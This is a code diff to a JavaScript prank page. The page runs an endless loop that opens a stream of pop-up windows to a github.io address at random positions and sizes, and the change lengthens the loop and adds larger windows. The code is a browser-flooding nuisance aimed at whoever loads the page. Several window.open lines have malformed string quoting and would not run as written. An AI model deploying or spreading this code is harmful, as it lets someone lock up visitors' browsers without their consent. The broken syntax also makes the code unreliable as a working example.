@@ -15,7 +15,7 @@
     
   window.close("https://mcma-keystone.github.io/cretinsgotbullcrap/main")
     
-   const loopTime = Math.round(Math.random()*5+5);
+   const loopTime = Math.round(Math.random()*5+8);
 for (;;) {
   
   for (let i = 0; i < loopTime; i++) {
@@ -26,8 +26,17 @@ for (;;) {
  
       for (let i = 0; i-10 < loopTime; i++) {
         
+        if (i <= 12) {
+        
           console.log('Iteration is #${i}');
-          window.open("https://mcma-keystone.github.io/cretinsgotbullcrap/hehe", "_blank", top="+String(Math.random()*1000)+",left="+String(Math.random()*1000)+", width="+String(Math.random()*20)+",height="+String(Math.random()*10)+")
+          window.open("https://mcma-keystone.github.io/cretinsgotbullcrap/hehe", "_blank", top="+String(Math.random()*1000)+",left="+String(Math.random()*1000)+", width="Math.random()*20+i",height="Math.random()*10+i")
+        }
+        
+        else {
+          
+          console.log('Iteration is #${i}');
+          window.open("https://mcma-keystone.github.io/cretinsgotbullcrap/hehe", "_blank", top="+String(Math.random()*1000)+",left="+String(Math.random()*1000)+", width=800, height=400)
+        }
   
     }
   
